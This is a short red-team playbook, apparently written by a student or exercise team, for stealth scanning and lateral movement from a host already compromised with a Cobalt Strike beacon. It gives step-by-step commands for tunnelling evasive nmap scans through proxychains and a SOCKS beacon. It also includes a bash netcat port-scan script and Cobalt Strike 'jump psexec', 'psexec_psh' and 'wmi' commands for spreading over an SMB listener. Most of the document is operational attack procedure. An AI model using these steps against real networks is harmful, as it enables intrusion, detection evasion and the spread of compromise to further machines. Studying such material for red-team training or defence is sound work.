Play Book
This is a play book created by team 4 for the purposes of stealth scan and lateral movement 
from one network to another. 




Stealth Scan execution of operations


-Assume that Cobalt Strike is already set up
-Assume that a computer is already compromised with a Cobalt Strike beacon 


1. Modify the proxychains config file to utilize the port that you will be opening up via your cobalt strike beacon to push your commands through the Cobalt Strike framework. The config file is located at   /etc/proxychains.config
-The last line of the config file has the ip address and the default port used for proxychains you will need to make sure the ip/port match with your cobalt strike server and port you will be opening up with the socks command to follow
Command: vim /etc/proxychains.conf
Command: scroll to the bottom and effect changes to file ip and port

2. From within Cobalt Strike, right click your beacon and select interact
3. Find the console at the bottom of the window, type in:
   1. socks <port you select (must not be in use by another service)>
4. Open up a terminal in Kali, type in:
   1. proxychains nmap -Pn  -f -sT -T4 --data-length 20 --randomize-hosts -v <TARGET_IP/ RANGE> -oA <NAME OF OUTPUT FILE>
   2. It is recommended to break up the scan into smaller chunks 
   3. Alternate to the nmap scan will be the nc scan script located below due to time constraints
#!/bin/bash
echo "enter the network address (first 3 octets)(ex. xxx.xxx.xxx): "
read net
echo "enter the starting ip address (ex. 1): "
read start
echo "enter the ending ip addrress (ex. 255): "
read end
echo "enter the ports you wish to scan (ex. 20-25 80): "
read port


for ((i=$start; $i<=$end; i++))
do
        nc -nvzw1 $net.$i $port 2>&1 | grep open
done












Lateral Movement execution of operations


-assume samba beacon for lateral movement 


1.        Your SMB listener works with a parent listener and is utilized for its named pipe for c2 reasons
2.        To create an SMB listener go to your listener tab in Cobalt Strike         click ‘add’ and select from the drop down SMB and input a name for your pipe lastly you need to give a descriptive name for your beacon
3.        From your interactive beacon you will select one of the following                         methods for lateral movement 
-jump psexec_psh <IP> <SMB Listener> 
-jump psexec <IP> <SMB Listener>
 -jump wmi <IP> <SMB Listener>




The following steps follow after the creation of a SMB beacon, if instructions for that are needed reference https://www.cobaltstrike.com/help-smb-beacon.
